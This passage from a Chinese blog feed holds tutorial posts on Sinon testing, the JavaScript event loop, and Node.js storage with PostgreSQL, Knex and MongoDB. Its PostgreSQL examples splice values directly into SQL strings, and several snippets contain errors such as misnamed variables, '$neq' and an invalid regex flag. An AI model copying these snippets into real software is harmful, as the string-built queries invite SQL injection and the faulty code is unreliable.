tips.sum(pricesWithTipAndTax).toFixed(2);totalAmount.should.equal('38.10');const totalAmountAsCurrency = tips.dollarFormat(totalAmount);totalAmountAsCurrency.should.equal('$38.10');const tipAsPercent = tips.percentFormat(tip);tipAsPercent.should.equal('15%'); 修改 package.json 中的脚本 123"scripts": &#123; "test": "node test/tips.js"&#125; 运行脚本，npm test 如果一切正常，不会输出什么。因为断言没有抛出错误。 Should.js 支持很多种断言，从使用正则表达式的到检查对象属性的全都有，其可以对程序生成的数据和对象进行全面的检查。处理断言库，测试时还经常要用到探测器、存根和模拟对象。 Sinon.JS 的探测器和存根模拟对象和存根库是测试工具箱里的工具。我们写单元测试是为了把系统的各个组成部分隔离单独测试，但有时候这很难做到。比如测试图片缩放的代码时，如果不想读写真正的图片文件，该怎么写测试代码，代码中不应该有避开文件系统读写的特殊测试分支，因为那样就不是真正的测试了。在这种情况下，需要创建文件系统的功能的存根。可以用存根来代替尚未准备好的依赖项，这有助于实现真正的 TDD。 下面介绍如何 用 SinonJS 编写测试探测器、存根和模拟对象。 初始化，安装依赖 12npm init -ynpm i --save-dev sinon 接着创建要测试的样例文件，这个例子里用了一个简单的 JSON 键/值数据库，创建一个文件系统 API 的存根，这样就不用在文件系统里创建真正的文件了。我们也可以像下面一样只测试数据库代码，避免处理文件的代码 123456789101112131415// db.jsconst fs = require('fs');class Database &#123; constructor(filename) &#123; this.filename = filename; this.data = &#123;&#125;; &#125; save(cb) &#123; fs.writeFile(this.filename, JSON.stringify(this.data), cb); &#125; insert(key, value) &#123; this.data[key] = value; &#125;&#125;module.exports = Database; 探测器 有时候我们只想看看某个方法是否调用了，探测器最适合做这个，借助它的 API ，可以将某个方法替换成能够进行断言的东西。比如用 Sinon 的方法替身 spy 模拟 db.js 中的 fs.writeFile: 1sinon.spy(fs.'writeFile'); 测试完成后，可以用 fs.writeFile.restore() 复原原来的方法。 在 Mocha 之类的测试库中使用时，应该把这些操作放在 beforeEach 和 afterEach 中，下面是探测器用法的完整例子 1234567891011121314151617// spies.jsconst sinon = require('sinon');const Database = require('./db');const fs = require('fs');const database = new Database('./sample.json');// ➊ 替换fs 方法const fsWriteFileSpy = sinon.spy(fs,'writeFile');const saveDone = sinon.spy();database.insert('name','Charles Dickens');database.save(saveDone);// ➋ 断言 writeFile 只调用一次sinon.assert.calledOnce(fsWriteFileSpy);// ➌ 恢复原来的方法fs.writeFile.restore(); 设置好探测器后➊运行要测试的代码。然后调用 sinon.assert➋确保方法被调用了。恢复原来的方法➌。这项测试中的恢复操作不是必须的，但恢复之前改变的方法是最佳实践。 存根 有时候要控制代码流程，比如在测试错误处理代码时，需要强制执行错误处理分支。可以用前面的例子改写，用存根取代探测器，以便执行 writeFile 的回调函数。注意，我们并不是想调用真正的 writeFile.只是希望能运行那个回调函数。下面的是例子。 12345678910111213141516171819202122// stub.jsconst sinon = require('sinon');const Database = require('./db');const fs = require('fs');const database = new Database('./sample.json');// 用自己的函数替代 writeFileconst stub = sinon.stub(fs,'writeFile',(file,data,cb)=&gt;&#123; cb();&#125;);const saveDone = sinon.spy();database.insert('name','Charles Dickens');database.save(saveDone);// 断言 writeFile 被调用了sinon.assert.calledOnce(stub);// 断言 database.save 的回调被调用了sinon.assert.calledOnce(saveDone);fs.writeFile.restore(); 在测试有大量用户提供的函数、回调和 promise 的代码时，把存根和探测器结合起来用是最理想的办法。看过这些单元测试工具后，我们该去探究另一种风格的测试了：功能测试。 功能测试在大多数 Web 项目的开发中，进行功能测试的办法都是按用户指定的需求列表驱动浏览器执行操作，然后检查各种 DOM 变化。比如在做一个内容管理系统时，要对图片库的上传功能做功能测试，也就是上传一张图片，然后检查是不是添加上了，在检查是不是加到了正确的图片列表中。 Node 中做功能测试的工具很多，它们大体上可以分成两类：无头测试和基于浏览器的测试。无头测试基本上都是用 PhantomJS 之类的工具提供一个可以在终端里使用的浏览器环境，也有轻便的一些方案会用 Cheerio 和 JSDOM 这样的库。基于浏览器的测试用 Selenium之类的浏览器自动化工具，通过脚本驱动真正的浏览器。两种测试方式用的底层工具都是一样的，可以根据自己的偏好用 Mocha、Jasmine 甚至Cucumber 驱动 Selenium 测试自己的程序。 Selenium 是基于 Java 的浏览器自动化库，在特定语言驱动器的帮助下，可以连接到 Selenium 服务上。用真正的服务器跑测试用例。 https://blog.csdn.net/huilan_same/article/details/51896672 总结 编写单元测试需要 Mocha 这样的测试运行器 Node 自带了一个 断言库 assert 还有其他断言库，包括 Chai 和 Should.js 如果不想运行某些代码，比如网络请求，可以用 SinonJS SinonJS 也可以探测代码，验证某个函数或方法是不是运行了。 通过利用脚本驱动真正的浏览器，可以用 Selenium 编写浏览器测试]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[（转）深入浅出JavaScript 运行机制]]></title>
    <url>%2F2018-12-28-(%E8%BD%AC)%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAJavaScript%E8%BF%90%E8%A1%8C%E8%BF%9B%E5%88%B6.html</url>
    <content type="text"><![CDATA[原文地址：深入浅出JavaScript运行机制（转）深入浅出JavaScript 运行机制读完之后有所收获，转载收藏。 一、引子本文介绍JavaScript运行机制，这一部分比较抽象，我们先从一道面试题入手： 123456console.log(1);setTimeout(function()&#123;console.log(3);&#125;,0);console.log(2);// 请问数字打印顺序是什么？ 这一题看似很简单，但如果你不了解JavaScript运行机制，很容易就答错了。题目的答案是依次输出1 2 3，如果你有疑惑，下文有详细解释。 二、理解JS的单线程的概念JavaScript语言的一大特点就是单线程，也就是说，同一个时间只能做一件事。那么，为什么JavaScript不能有多个线程呢？这样能提高效率啊。JavaScript的单线程，与它的用途有关。作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定JavaScript同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变。 三、理解任务队列(消息队列)单线程就意味着，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。JavaScript语言的设计者意识到这个问题，将所有任务分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入”任务队列”（task queue）的任务，只有”任务队列”通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。异步任务包括宏任务和微任务(后面会重点介绍)，接下来我们通过两个例子说明同步任务和异步任务的区别： 1234console.log("A");while(true)&#123; &#125;console.log("B");// 请问最后的输出结果是什么？ 如果你的回答是A,恭喜你答对了，因为这是同步任务，程序由上到下执行，遇到while()死循环，下面语句就没办法执行。 123456console.log("A");setTimeout(function()&#123;console.log("B");&#125;,0);while(true)&#123;&#125;// 请问最后的输出结果是什么？ 如果你的答案是A，恭喜你现在对js运行机制已经有个粗浅的认识了！题目中的setTimeout()就是个异步任务。在所有同步任务执行完之前，任何的异步任务是不会执行的，关于这点下文还会详细说明。 四、理解Event Loop异步执行的运行机制如下： 所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。 主线程之外，还存在一个”任务队列”（task queue）。只要异步任务有了运行结果，就在”任务队列”之中放置一个事件。 一旦”执行栈”中的所有同步任务执行完毕，系统就会读取”任务队列”，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。 主线程不断重复上面的第三步。 主线程从”任务队列”中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）。只要主线程空了，就会去读取”任务队列”，这就是JavaScript的运行机制。这个过程会循环反复。以下这张图可以很好说明这点。 五、哪些语句会放入异步任务队列及放入时机一般来说，有以下四种会放入异步任务队列： setTimeout和setlnterval DOM事件 ES6中的Promise Ajax异步请求 javascript 代码运行分两个阶段： 1、预解析—把所有的函数定义提前，所有的变量声明提前，变量的赋值不提前 2、执行—从上到下执行（按照js运行机制） 至于放入异步任务队列的时机，我们通过 setTimeout的例子和Ajax例子来详细说明： 1234567例题1for (var i = 0; i &lt; 5; i++) &#123;setTimeout(function() &#123; console.log(i); &#125;, 1000);&#125;// 请问最后的输出结果是什么？ for循环一次碰到一个 setTimeout()，并不是马上把setTimeout()拿到异步队列中，而要等到一秒后，才将其放到任务队列里面，一旦”执行栈”中的所有同步任务执行完毕（即for循环结束，此时i已经为5），系统就会读取已经存放”任务队列”的setTimeout()（有五个），于是答案是输出5个5。 上面也提到，在到达指定时间时，定时器就会将相应回调函数插入“任务队列”尾部。这就是“定时器（timer）”功能。 关于定时器的重要补充： 定时器包括setTimeout与 setInterval 两个方法。它们的第二个参数是指定其回调函数推迟/每隔多少毫秒数后执行。 对于第二个参数有以下需要注意的地方： 当第二个参数缺省时，默认为 0； 当指定的值小于 4 毫秒，则增加到 4ms(4ms 是 HTML5 标准指定的，对于 2010 年及之前的浏览器则是 10ms);也就是说至少需要4毫秒，该setTimeout()拿到任务队列中。 1234567891011121314// 例题2$.ajax(&#123;url：“xxxxx",success:function (result)&#123;console.log("a") &#125;&#125;)setTimeout(function ()&#123;console.log("b")&#125;,100)setTimeout(function ()&#123;console.log("c")&#125;)console.log("d"); ajax加载完成时才会放入异步队列，至于这段时间不确定，所有有两种情况：①大于100ms,最后的结果是 d c b a ;②小于100ms,最后的结果便是d c a b。 六、微任务(Microtask)与宏任务(Macrotask) 我们上面提到异步任务分为宏任务和微任务，宏任务队列可以有多个，微任务队列只有一个。 宏任务包括：script(全局任务), setTimeout, setInterval, setImmediate, I/O, UI rendering。 微任务包括: new Promise().then(回调), process.nextTick, Object.observe(已废弃), MutationObserver(html5新特性) 当执行栈中的所有同步任务执行完毕时，是先执行宏任务还是微任务呢？ 由于执行代码入口都是全局任务 script，而全局任务属于宏任务，所以当栈为空，同步任务任务执行完毕时，会先执行微任务队列里的任务。 微任务队列里的任务全部执行完毕后，会读取宏任务队列中拍最前的任务。 执行宏任务的过程中，遇到微任务，依次加入微任务队列。 栈空后，再次读取微任务队列里的任务，依次类推。 一句话概括上面的流程图：当某个宏任务队列的中的任务全部执行完以后,会查看是否有微任务队列。如果有，先执行微任务队列中的所有任务，如果没有，就查看是否有其他宏任务队列。 接下来我们看两道例子来介绍上面流程： 123456789101112Promise.resolve().then(()=&gt;&#123; console.log('Promise1') setTimeout(()=&gt;&#123; console.log('setTimeout2') &#125;,0)&#125;)setTimeout(()=&gt;&#123; console.log('setTimeout1') Promise.resolve().then(()=&gt;&#123; console.log('Promise2') &#125;)&#125;,0) 最后输出结果是Promise1，setTimeout1，Promise2，setTimeout2 一开始执行栈的同步任务执行完毕，会去查看是否有微任务队列，上题中存在(有且只有一个)，然后执行微任务队列中的所有任务输出Promise1，同时会生成一个宏任务 setTimeout2 然后去查看宏任务队列，宏任务 setTimeout1 在 setTimeout2 之前，先执行宏任务 setTimeout1，输出 setTimeout1 在执行宏任务setTimeout1时会生成微任务Promise2 ，放入微任务队列中，接着先去清空微任务队列中的所有任务，输出 Promise2 清空完微任务队列中的所有任务后，就又会去宏任务队列取一个，这回执行的是 setTimeout2 12345678910111213console.log('----------------- start -----------------');setTimeout(() =&gt; &#123; console.log('setTimeout');&#125;, 0)new Promise((resolve, reject) =&gt;&#123; for (var i = 0; i &lt; 5; i++) &#123; console.log(i); &#125; resolve(); // 修改promise实例对象的状态为成功的状态&#125;).then(() =&gt; &#123; console.log('promise实例成功回调执行');&#125;)console.log('----------------- end -----------------'); 七、题外话如果要输出0~4，上面例题应该如何修改？ 将var变为let 12345for (let i = 0; i &lt; 5; i++) &#123;setTimeout(function() &#123; console.log(i); &#125;, 1000);&#125; 2.加个立即执行函数 1234567for (var i = 0; i &lt; 5; i++) &#123;(function(i)&#123;setTimeout(function() &#123; console.log(i); &#125;, 1000);&#125;)(i)&#125; 3.也可以通过这样加闭包 123456789for(var i = 1;i &lt; 5;i++)&#123; var a = function()&#123; var j = i; setTimeout(function()&#123; console.log(j); &#125;,1000) &#125; a();&#125; 八、参考资料JavaScript 运行机制详解：再谈Event Loop 关于JavaScript单线程的一些事 JS事件循环机制（event loop）之宏任务/微任务 前端基础进阶（十二）：深入核心，详解事件循环机制 事件循环机制的那些事]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>深入浅出 JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejs实战 —— 存储数据]]></title>
    <url>%2F2018-12-21-NodeJs2-Part8.html</url>
    <content type="text"><![CDATA[读 《node.js实战2.0》，进行学习记录总结。 当当网购买链接 豆瓣网1.0链接 存储数据本章内容： 关系型数据库：PostgreSQL 非关系型数据库：MongoDB ACID 类 云数据库和存储服务 关系型数据库关系型数据库以关系代数和集合论为理论基础。用模式指定各种数据类型的格式和这些数据类型之间的关系。例如，做社交网络时会有 User 和 Post 类型，它们之间还会有一对多的关系，然后用结构化查询语言（SQL）发起数据查询，比如“给我ID 为 123 的用户名下的所有帖子”，用 SQL 表示就是： 1SELECT * FROM post WHERE user_id = 123 PostgreSQL在 Node 程序中，MySQL 和 PostgreSQL 都是常用的关系型数据库。选择看个人喜好。 安装和配置Postgres 的安装（win）,从 https://postgresql.org 下载安装器。安装和配置教程 win 启动：psql -h localhost -U postgres 从 Node 中连接 Postgres在 Node 中与 Postgres 交互最受欢迎的包就是 pgm，也可以用 npm包装： 1npm install pg --save 连接数据库 123456789const pg = require('pg');// 配置连接参数const db = new pg.Client(&#123; database: 'articles' &#125;);db.connect((err,client) =&gt;&#123; if(err) throw err; console.log('Connected to database',db.database); // 关闭数据库连接 Node 进程可以退出 db.end();&#125;); 期间报的一些错误例如： 12role "Administrator" does not existrole "Administrator" is not permitted to log in 可以通过 pgAdmin4 进行可视化的配置，创建新的角色并且赋予一些功能，例如可以登入或者是设定为超级用户。 定义表首先像下面这样定义表，确定表中存储的数据形式。 12345678910111213const pg = require('pg');// 配置连接参数const db = new pg.Client(&#123; database: 'articles' &#125;);db.connect((err, client) =&gt; &#123; if (err) throw err; console.log('Connected to database', db.database); db.query(`CREATE TABLE IF NOT EXISTS snippets(id SERIAL,PRIMARY KEY(id),body text)`, (err, result) =&gt; &#123; if (err) throw err; console.log('Created table "snippets"'); // 关闭数据库连接 Node 进程可以退出 db.end(); &#125;);&#125;); 可以shell 里面看到该table 表 或者是通过 pgAdmin 查看 插入数据表定义好了后，可以像下面这样使用 INSERT 查询插入数据。如果不指定 id，PostgreSQL 会自动生成一个。要想知道生成ID 是什么，需要在查询语句里加上 RETURNING id,然后可以在回调函数的结果集参数中得到id的值。 1234567891011121314151617db.connect((err, client) =&gt; &#123; if (err) throw err; console.log('Connected to database', db.database); const body = 'hello world'; db.query(` INSERT INTO snippets (body) VALUES ( '$&#123;body&#125;' ) RETURNING id `, (err, result) =&gt; &#123; if (err) throw err; const id = result.rows[0].id; console.log('Inserted row with id %s', id); db.end(); &#125;);&#125;); 更新数据插入数据后，可以像下面的 UPDATE 查询更新数据。受影响的记录数放在查询结果中的 rowCount 属性上。 12345678910111213141516171819202122db.connect((err, client) =&gt; &#123; if (err) throw err; console.log('Connected to database', db.database); const body = 'hello world'; db.query(` INSERT INTO snippets (body) VALUES ('$&#123;body&#125;') RETURNING id; `, (err, result) =&gt; &#123; if (err) throw err; const id = result.rows[0].id; const updatedBody = 'greetings, world'; console.log('Inserted row with id %s', id); db.query(` UPDATE snippets SET body = '$&#123;updatedBody&#125;' WHERE id = $&#123;id&#125;; `,(err,result) =&gt;&#123; if (err) throw err; console.log(); db.end(); &#125;); &#125;);&#125;); 查询数据关系型数据库的能量主要体现在复杂的数据查询上，查询语句使用 SELECT ,例如 123456db.query(` SELECT * FROM snippets ORDER BY id;`,(err,result)=&gt;&#123; if(err) throw err; console.log(result.rows);&#125;); Postgresql v11文档 Knex很多开发人员不喜欢把 SQL 直接放在代码里，希望有一个抽象层隔离一下。因为用字符串拼接 SQL 语句太繁琐了，而且查询可能会变得越来越难以理解和维护。对于 JavaScript 来说更是如此，因为在 ES6 模板常量出来之前，它连表示多行字符串的语法都没有。 Knex是一个轻便的 SQL 抽象包，它被称为查询构建器。我们可以通过查询构建器的声明式 API 构造出 SQL 字符串，Knex 的 API 简单直白： 12345knex(&#123; client:'mysql'&#125;) .select() .from('users') .where(&#123; id:'123'&#125;) ,toSQL(); 这段代码会生成一个 MySQL 的参数化 SQL 查询： 1select * from `users` where `id` = ? 查询构建器尽管业界在 20世纪 80年代中期就确立了 ANSI 和 ISO SQL 标准。不过直到现在，大多数数据库用的仍然是自己的 SQL 方言。但 PostgreSQL 是个例外，它遵循了 SQL:2008 标准。查询构建器能在支持多种数据库的同时消除各种 SQL 方言的差异，提供一个统一的 SQL 生成接口。对于经常要在不同的数据库技术之间进行切换的团队来说，查询构建器提供的好处不言而喻。 Knex.js 支持的数据库有： PostgreSQL MSSQL MYSQL MariaDB SQLite3 Oracle Knex 支持 promise 和 Node 风格的回调 用 Knex 实现连接和查询Knex 不像其他查询构建器，它还可以根据选定的数据库驱动连接数据库并执行查询语句： 123456db('articles') .select('title') .where(&#123;title:'Today’s News'&#125;) .then(articles =&gt;&#123; console.log(articles);&#125;); Knex 查询默认返回 promise,但也提供了 .asCallback 方法，可以按照惯例支持回调函数： 1234567db('articles') .select('title') .where(&#123;title:'Today’s News'&#125;) .asCallback((err,articles) =&gt;&#123; if(err) throw err; console.log(articles);&#125;); 下面代码用 sqlit3s实现了简单的 Article 模型，将它保存为 db.js 。安装依赖 1npm install knex@~0.12.0 sqlite3@~3.1.0 --save 1234567891011121314151617181920212223242526272829303132const knex = require('knex');const db = knex(&#123; client: 'sqlite3', connection: &#123; filename: 'tldr.sqlite' &#125;, useNullAsDefault: true&#125;);module.exports = () =&gt; &#123; return db.schema.createTableIfNotExists('articles', table =&gt; &#123; table.increments('id').primary(); table.string('title'); table.text('content'); &#125;);&#125;module.exports.Article = &#123; all() &#123; return db('articles').orderBy('title'); &#125;, find(id) &#123; return db('articles').where(&#123; id &#125;).first(); &#125;, create(data) &#123; return db('articles').insert(data); &#125;, delete(id) &#123; return db('articles').del().where(&#123; id &#125;); &#125;&#125; 现在可以用 db.Article 添加 Article 记录了。 123456789101112const db = require('./db');db().then(() =&gt; &#123; ab.Article.create(&#123; title: 'my article', content: 'article content' &#125;).then(() =&gt; &#123; ad.Article.all().then(articles =&gt; &#123; console.log(articles); process.exit(); &#125;); &#125;);&#125;).catch(err =&gt; &#123; throw err &#125;); SQLite 几乎不需要配置，不用启动服务器守护进程，也不用在程序外面创建数据库。SQLite 把所有东西都写到一个文件里。运行前面的代码后，当前目录下会有一个 .sqlite 文件。删掉这个文件就能把数据库抹掉： 1rm articles.sqlite SQLite 还有内存模式，完全不用往硬盘里写东西。在进行自动化测试时，一般会用这种模式降低运行时间，带有：memory: 的特殊文件名会启用内容模式。在启用内存模式后，如果有多个连接，那么每个连接都会有自己的私有数据库： 1234567const db = knex(&#123; client: 'sqlite3', connection: &#123; filename: 'tldr.sqlite' &#125;, useNullAsDefault: true&#125;); 切换数据库因为用了 Knex,所以把之前代码换成 PostgreSQL 很容易，跟 PostgreSQL 服务器交互需要用到 pg 包，要将其安装好并跑起来。把 pg 包安装，并用 PostgreSQL 的 createdb 命令创建对应的数据库： 12npm install pg --save createdb articles 只要修改 Knex 的配置就能换成这个新数据库。对外的 API 和使用还是一样的: 123456const db = knex(&#123; client: 'pg', connection:&#123; database: 'articles' &#125;&#125;) 注意抽象漏洞 查询构建器能够对 SQL 语法做标准化处理，但改变不了数据库的行为。有些特性只有特定数据库提供支持，而且对于同样的查询，不同的数据库可能会有不同的行为，比如下面这两个特定主键的方法： table.increments(‘id’).primary(); table.integer(‘id’).primary() 在 SQLite3 上都没有问题，但在 PostgreSQL 上插入记录时，第二个会出错。 1"null value in column "id" violates not-null constraint" 在 SQLite 上，如果插入的记录主键为 Null,不管是否配置自增长主键，都会自动赋给它一个自增长的 ID 。而 PostgreSQL 只有主键显式定义为自增长主键时才会如此处理。这样的行为差异很多，并且有些差异导致的错误可能无法轻易发现。如果切换数据库，一定要进行充分的测试。 MySQL 和 PostgreSQLMySQL 和 PostgreSQL 都是成熟高效的数据库系统，并且对于很多项目来说，它们几乎没有什么差别。直到项目需要扩张时，开发人员才会感觉到它们在接口边缘或接口之下的差异。 得注意的差别： PostgreSQL 支持一些表达能力更强的数据类型，比如数组、JSON 和用户定义的类型； PostgreSQL 自带全文搜索功能； PostgreSQL 全面支持 ANSI SQL:2008 标准； PostgreSQL 的复制功能不如 MySQL 强大，或者说没有经受过那么严苛的考验； MySQL 资历更老、社区更大，有更多的工具和资源； MySQL 有很多有微妙差别的分支（比如 MariaDB 和 WebScaleSQL 这些受到 Facebook、Google、Twitter 等公司支持的版本） MySQL 的可插拔存储引擎不太好理解，管理和调优也有一定的难度。不过换个角度来看，这也意味着可以对它的性能做更精细的控制。 选哪个数据库并不会影响项目成功与否，所以不要在这个问题上纠结。如果有必要，以后也可以做数据库迁移，但 PostgreSQL 应该足以满足你对功能特性和扩展能力的需求。但如果你恰好要对数据库的评估选型负责，则有必要熟悉一下 ACID 保证 ACID 保证ACID（原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）和耐用性（Durability）） 是对数据库事务的一组要求：原子性、一致性、隔离线和耐用性。这些术语的确切定义可能会变。但一般来说，系统对 ACID 保证越严格，在性能上作出的让步就越大。开发人员用ACID 分类来交流不同方案所做的妥协，比如在聊 NoSQL 系统时。 原子性：无论成败，事务必须整体执行原子性事务不能被部分执行：或者整个操作都完成了，或者数据库保持原样。比如说要删除某个用户的所有理论，如果作为一个事务的话，或者全部删除了，或者一条也没有删。最终不能是有些删除，有些还保持原来的状态，甚至在系统出错或断电后，仍然保持原子性。原子性：不可再分。 一致性：始终确保约束条件成功完成的事务必须符合系统中定义的所有数据完整性约束。比如主键必须唯一、数据要符合某种特定的模式，或者外键指向存在的实体。产生不一致状态的事务一般也会失败，然后小问题是可以自动解决的，比如将数据转换成正确的形态。 隔离性：并发事务不会互相干扰不管是并发还是线性执行，隔离性事务的执行结果应该都是一样的。系统的隔离水平会直接影响它执行并发操作的能力。全局锁是一种比较低幼的隔离方式，由于在事务期间会把整个数据库锁住，所以只能串行处理事务。这是很强的隔离性保证，但效率也极低；那些跟事务完全没有关联的数据库集根本不应该被锁住（比如说，一个用户添加评论时不应该导致另一个用户无法更行自己的个人资料）。在现实情况中，数据库系统会提供精细的和有选择性的锁模式（比如锁自己的个人资料）。在现实情况中，数据库系统会提供更加精细的和有选择性的锁模式（比如锁表、锁记录和锁数据域），以实现各种程序的隔离水平。更复杂的系统甚至有可能会采用隔离水平最低的锁模式，乐观地执行所有事务，直到检测到冲突时才会逐步细化锁模式。 耐用性：事务是永久性的事务的耐用性是对持久性生效的保证，在重启，断电、系统错误甚至是硬件失效的情况下，持续化的效果依然不受影响。比如 SQLite 内存模式下的事务就很没有耐用性，进程退出后所有数据都没有了。而在 SQLite 把数据写到硬盘中时，事务的耐用性就很好了，因为机器重启后数据还在。 这看起来好像很简单：只要把数据写到硬盘里就好了，事务就有耐用性了。但硬盘 I/O 是比较慢的操作，即便程序规模增长比较温和时，I/O 操作也会迅速变成性能瓶颈。为了保证系统性能，有些数据库会提供不同的耐用性折中方案。 NoSQL非关系模型的数据存储统称为 NoSQL 。因为现在有些 NoSQL 数据库确实支持 SQL ，所以 NoSQL 的含义更接近非关系型，或者被当做不仅是 SQL 的缩写。 下面举一些 NoSQL 的范式以及相应的数据库的例子： 键-值/元组存储——DynamoDB、LevelDB、Redis、etcd、Aerospike、Berkeley DB 图存储——Neo4J、OrientDB 文档存储——CouthDB、MongoDB、RRDtool 列存储——Cassandra、HBase 时间序列存储——Graphite、InfluxDB、RRDtool 多范式——Couchbase（文档数据库、键/值存储、分布式缓存） NoSQL 官网上有更完整的 NoSQL 数据库列表。如果你只用过关系型数据库，可能不太容易接受 NoSQL 的概念，因为 NoSQL 的用法经常会违反你已经习惯了的最佳实践：没有模式定义、重复的数据、松散的强制性约束。NoSQL 系统经常会将赋予数据库的责任放到应用程序上。这看起来可能会很乱。 般情况下，只要一小部分访问模式就会创建大量的数据库工作负载，比如生成程序登录画面的查询，需要获取很多域对象。在关系型数据库中，要提高读取性能时一般会做非规范化，给客户端的域查询要经过预处理并形成可以降低查询次数的形态 一般来说，NoSQL 数据默认就是非规范化的，甚至会跳过域建模。这样就不会在数据模型上做过多工作，修改起来会更迅速，并形成更简单、更好执行的设计。 分布式数据库程序可以在垂直和水平两个方向上扩展，垂直扩展是指增加机器的能力，水平扩展是增加机器的数量。垂直扩展一般会更简单，但受限于一台机器所能达到的硬件水平，而且成本上升很快。相对来说，水平扩展时，系统的能力是随着处理器和机器的增加而增长的。因为要协调更多动态组件，所以会增加复杂性。所有增加的系统最终都会达到一个点，之后只能做水平扩展。 分布式数据库从一开始就是按照水平扩展设计的。把数据存储在多台机器上解决了单点故障问题，可以提升耐用性。很多关系型系统都可以用分片、主/从、主/主复制等形态进行一定的水平扩展，但不会超过几百个节点。比如 MySQL 集群的上限是 255节点。而分布式数据库可以有几千个节点。 MongoDBMongoDB 是面向对象的分布式数据库，使用它的 Node 开发人员特别多。时髦的 MEAN 栈中的 M 就是 MongoDB（另外三个是 Express、Angular 和 Node），一般我们刚开始接触 Node 时遇到的第一个数据库就是它。 MongoDB 受到的批评和争议非常多。尽管如此，它仍然是很多开发人员的主存储。很多著名公司都部署了 MongoDB，包括 Adobe、LinkedIn、eBay，甚至欧洲粒子物理研究所（CERN）的大型强子对撞机组件上都在用它。 MongoDB 数据库把文档存储在无模式的数据集中。不需要预先为文档定义模式，同一个数据集中的文档也不用遵循相同的模式。这给了 MongoDB 很大的灵活性，但程序要因此承担起保证数据一致性的责任，确保文档的结构是可预测的。 安装和配置不同系统上的 MongoDB 安装是不一样的。MacOS 上就是简单的： 1brew install mongodb MongoDB 服务器是用可执行文件 mongod 启动的： 1mongod --config /usr/local/etc/mongod.conf Christian Amor Kvalheim 的官方 mongodb 包是最受欢迎的 MongoDB 驱动： 1npm install mongodb@^2.1.0 --save Windows 用户注意一下，这个驱动的安装需要 Microsoft Visual Studio 的 msbuild.exe 123456const &#123; MongoClient &#125; = require('mongodb');MongoClient.connect('mongodb://localhost:27017/articles') .then(db =&gt; &#123; console.log('Client ready'); db.close(); &#125;, console.error); 连接成功的处理器会得到一个数据库客户端实例，所有数据库命令都是交给它执行的。 大部分数据库交互都是通过 collection API 完成的： API 说明 collection.insert(doc) 插入一个或多个文档 collection.find(query) 找出跟查询匹配的文档 collection.remove(query) 移除跟查询匹配的文档 collection.drop() 移除整个数据集 collection.update(query) 更新跟查询匹配的文档 collection.count(query) 对跟查询匹配的文档计数 collection.insertOne(query) 插入单个文档 collection.insertMany([doc1,doc2]) 插入多个文档 collection.findOne(query) 找出一个跟查询匹配的文档 collection.updateMany(query) 更新所有跟查询匹配的文档 插入文档collection.insertOne 将单个对象作为文档存到数据集里，成功处理器会得到一个包含操作元信息的对象。 123456789101112131415161718const &#123; MongoClient &#125; = require('mongodb');MongoClient.connect('mongodb://localhost:27017/articles') .then(db =&gt; &#123; console.log('Client ready'); const article = &#123; title: 'I like cake', content: 'It is quite good' &#125;; db.collection('articles') .insertOne(article) .then(result =&gt; &#123; // 如果文档中没有_id,会创建一个新的 ID，insertedId 就是那个ID console.log(result.insertedId); // 定义文档的原始对象中增加了一个新属性_id console.log(article._id); db.close(); &#125;); &#125;, console.error); insertMany 的用法也差不多，只是参数是包含多个对象的数组。insertMany 的结果不再是一个 insertedId，而是包含多个 ID 的 insertedIds 数组，ID 的顺序跟作为参数的数组中的文档顺序一样 查询从数据集中读取文档的方法（比如 find、update 和 remove ）都会有一个查询参数，用来匹配文档。最简单的查询就是一个对象，MongoDB 会匹配结构和值相同的文档。比如下面这个查询会匹配所有标题为 ‘I like cake’ 的文档。 1234567db.collection('articles') .find(&#123; title: 'I like cake' &#125;) .toArray() .then(results =&gt; &#123; console.log(results); db.close(); &#125;); 或者基于查询操作符匹配： 123db.collection('articles')// 标题以“cake”结尾的文档，大小写敏感 .find(&#123;title: &#123; $regex: /cake$/I &#125;&#125;) MongoDB 查询语言中的查询操作符很多，比如： $eq——等于某个值； $neq——不等于某个值； $in——在数组中； $nin——不在数组中; $lt、$lte、$gt、$gte——大于/小于或等于比较值； $near——地理位置值在某个区域附近； $not、$and、$or、$nor——逻辑操作符。 这些操作符几乎可以组合出所有查询条件，创造出可读性强、精巧的、富有表达力的查询语句。更多与查询和查询操作符有关的内容请浏览 Query and Projection Operators 网站。 用 MongoDB 实现 Article API 1234567891011121314151617181920212223242526const &#123; MongoClient, ObjectID &#125; = require('mongodb');let db;module.exports = () =&gt; &#123; return MongoClient .connect('mongodb://localhost:27017/articles') .then((client) =&gt; &#123; db = client; &#125;);&#125;module.exports.Article = &#123; all() &#123; return db.collection('articles2').find().sort(&#123; title: 1 &#125;).toArray(); &#125;, find(_id) &#123; if (typeof _id !== 'object') _id = ObjectID(_id); return db.collection('articles2').findOne(&#123; _id &#125;); &#125;, create(data) &#123; return db.collection('articles2').insertOne(data, &#123; w: 1 &#125;); &#125;, delete(_id) &#123; if (typeof _id !== 'object') _id = ObjectID(_id); return db.collection('articles2').deleteOne(&#123; _id &#125;, &#123; w: 1 &#125;); &#125;&#125; 用法示范: 连接数据库返回的 promise，然后用 Article 的 create 方法创建了一篇文章。再加载所有文章，输出。 123456789const db = require('./db');db().then(() =&gt; &#123; db.Article.create(&#123; title: 'An title' &#125;).then(() =&gt; &#123; db.Article.all().then(articles =&gt; &#123; console.log(articles); process.exit(); 